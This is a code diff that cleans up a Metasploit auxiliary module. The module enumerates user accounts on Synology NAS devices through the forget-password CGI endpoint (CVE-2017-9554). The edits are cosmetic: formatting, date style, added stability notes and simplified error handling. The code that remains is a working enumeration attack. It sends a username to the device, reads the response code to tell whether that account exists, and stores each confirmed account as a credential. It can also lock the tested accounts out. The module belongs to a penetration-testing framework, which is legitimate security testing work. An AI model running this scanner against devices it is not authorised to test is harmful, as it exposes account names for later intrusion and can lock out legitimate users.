@@ -13,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Synology Forget Password  User Enumeration Scanner',
+        'Name' => 'Synology Forget Password User Enumeration Scanner',
         'Description' => %q{
           This module attempts to enumerate users on the Synology NAS
           by sending GET requests for the forgot password URL.
@@ -31,13 +31,17 @@ class MetasploitModule < Msf::Auxiliary
           'Steve Kaun' # POC
         ],
         'License' => MSF_LICENSE,
-        'References' =>
-          [
-            [ 'EDB', '43455' ],
-            [ 'CVE', '2017-9554' ],
-            [ 'URL', 'https://www.synology.com/en-global/security/advisory/Synology_SA_17_29_DSM' ]
-          ],
-        'DisclosureDate' => 'Jan 5 2011'
+        'References' => [
+          [ 'EDB', '43455' ],
+          [ 'CVE', '2017-9554' ],
+          [ 'URL', 'https://www.synology.com/en-global/security/advisory/Synology_SA_17_29_DSM' ]
+        ],
+        'DisclosureDate' => '2011-01-05',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ACCOUNT_LOCKOUTS, IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -108,48 +112,45 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def do_enum(username)
-    begin
-      vprint_status("Attempting #{username}")
-      res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path, 'webman', 'forget_passwd.cgi'),
-        'method' => 'GET',
-        'vars_get' => {
-          'user' => username
-        }
-      })
-      unless res
-        print_error('Connection to host refused')
-        fail_with(Failure::Unreachable, 'Connection to host refused')
-      end
-      j = res.get_json_document
-      if j['msg'] == 5
-        fail_with(Failure::Disconnected, 'You have been locked out.  Retry later or increase DELAY')
-      end
-      if j['msg'] == 3
-        fail_with(Failure::UnexpectedReply, 'Device patched or feature disabled')
-      end
-      if j['msg'] == 2 || j['msg'] == 1
-        print_good("#{username} - #{j['info']}")
-        @users_found[username] = :reported
-        report_cred(
-          ip: rhost,
-          port: rport,
-          service_name: (ssl ? 'https' : 'http'),
-          proof: res.body
-        )
-      end
-      # msg 1 means user can login to GUI
-      # msg 2 means user exists but no GUI login
-      # msg 3 means not supported/disabled/patched
-      # msg 4 means no user
-      # msg 5 means auto block is enabled and youre blocked. Default is 10 login attempts, and these
-      #     count as lgin attempts.
-    rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionError
+    vprint_status("Attempting #{username}")
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'webman', 'forget_passwd.cgi'),
+      'method' => 'GET',
+      'vars_get' => {
+        'user' => username
+      }
+    })
+    unless res
       print_error('Connection to host refused')
       fail_with(Failure::Unreachable, 'Connection to host refused')
-    rescue Timeout::Error, Errno::EPIPE
-      fail_with(Failure::Unreachable, 'Connection issue')
     end
-
+    j = res.get_json_document
+    if j['msg'] == 5
+      fail_with(Failure::Disconnected, 'You have been locked out.  Retry later or increase DELAY')
+    end
+    if j['msg'] == 3
+      fail_with(Failure::UnexpectedReply, 'Device patched or feature disabled')
+    end
+    if j['msg'] == 2 || j['msg'] == 1
+      print_good("#{username} - #{j['info']}")
+      @users_found[username] = :reported
+      report_cred(
+        ip: rhost,
+        port: rport,
+        service_name: (ssl ? 'https' : 'http'),
+        proof: res.body
+      )
+    end
+    # msg 1 means user can login to GUI
+    # msg 2 means user exists but no GUI login
+    # msg 3 means not supported/disabled/patched
+    # msg 4 means no user
+    # msg 5 means auto block is enabled and youre blocked. Default is 10 login attempts, and these
+    #     count as lgin attempts.
+  rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionError
+    print_error('Connection to host refused')
+    fail_with(Failure::Unreachable, 'Connection to host refused')
+  rescue Timeout::Error, Errno::EPIPE
+    fail_with(Failure::Unreachable, 'Connection issue')
   end
 end
